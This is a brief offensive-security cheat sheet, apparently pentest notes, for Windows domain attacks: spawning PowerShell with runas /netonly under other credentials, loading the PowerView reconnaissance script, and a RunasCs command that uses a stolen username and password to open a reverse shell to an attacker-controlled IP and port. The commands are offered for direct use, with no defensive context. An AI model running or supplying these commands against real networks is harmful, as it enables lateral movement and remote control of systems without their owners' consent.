Runas
```powershell
runas.exe /netonly /user:'domain'\'user' powershell.exe
```

AD Module with [Powerview](https://github.com/PowerShellMafia/PowerSploit)
```
. .\Powerview.ps1
```

Reverse shell with RunAsCs
```powershell
.\RunasCs.exe "{USER}" "{PASSWORD}" cmd.exe -r {ATTACKER_IP}:{ATTACKER_PORT} -d {DOMAIN}
```


